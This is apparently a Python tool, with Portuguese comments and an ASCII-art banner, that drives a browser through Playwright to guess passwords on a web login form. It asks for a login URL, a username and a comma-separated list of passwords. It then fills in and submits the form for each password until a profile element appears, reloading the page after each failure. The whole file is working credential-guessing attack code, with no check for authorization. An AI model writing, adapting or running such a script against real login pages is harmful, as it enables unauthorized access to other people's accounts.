import time
import os
from playwright.sync_api import sync_playwright  # Importando Playwright

os.system('clear')
os.system('cls')

# Exibindo a arte ASCII
print("""
 _____ _         _                 _             
|  _  |_|___ ___| |_ ___ _____ ___| |___ ___ ___ 
|     | |  _|  _|   | .'|     | -_| | -_| . |   |
|__|__|_|_| |___|_|_|__,|_|_|_|___|_|___|___|_|_| 
""")

# Perguntar ao usuário pela URL, nome de usuário e senhas a serem testadas
login_url = input("Digite a URL do formulário de login: ")
username = input("Digite o nome de usuário: ")

# Perguntar as senhas
password_input = input("Digite as senhas separadas por vírgula: ")
password_list = [senha.strip() for senha in password_input.split(',')]

# Usar Playwright para automação de navegação
with sync_playwright() as p:
    # Iniciar o navegador (neste caso, Chrome, mas você pode usar Firefox ou WebKit)
    browser = p.chromium.launch(headless=False)  # `headless=False` para ver o navegador rodando
    page = browser.new_page()

    # Acessar a página de login
    page.goto(login_url)

    # Encontrar os campos de login (usuário e senha) e o botão de login
    username_field = page.locator('input[name="username"]')
    password_field = page.locator('input[name="password"]')
    login_button = page.locator('button[type="submit"]')

    # Loop para tentar todas as senhas da lista
    for senha in password_list:
        print(f"Tentando senha: {senha}")
        
        # Limpar campos antes de preencher
        username_field.fill('')  # Limpar campo de nome de usuário
        password_field.fill('')  # Limpar campo de senha

        # Preencher os campos de login
        username_field.fill(username)
        password_field.fill(senha)

        # Enviar o formulário de login (clicar no botão)
        login_button.click()

        # Esperar a página carregar após o clique no botão de login
        time.sleep(3)  # Dê um tempo para garantir que a página foi atualizada

        try:
            # Esperar um elemento específico da página de perfil, como o botão de perfil ou um menu, estar visível
            page.wait_for_selector("//span[@aria-label='Perfil']", timeout=10000)

            print(f"Login bem-sucedido com a senha: {senha}")
            break  # Se o login for bem-sucedido, sai do loop

        except Exception as e:
            # Se o login não foi bem-sucedido, recarregar a página e tentar novamente
            print(f"Tentativa falhou com a senha: {senha}")
            
            # Recarregar a página para limpar os campos
            page.reload()

            # Esperar a página ser recarregada e os campos estarem prontos
            page.wait_for_selector('input[name="username"]')

            print("Página recarregada, tentando próxima senha.")

    else:
        print("Todas as tentativas falharam.")

    # Fechar o navegador após o processo
    browser.close()
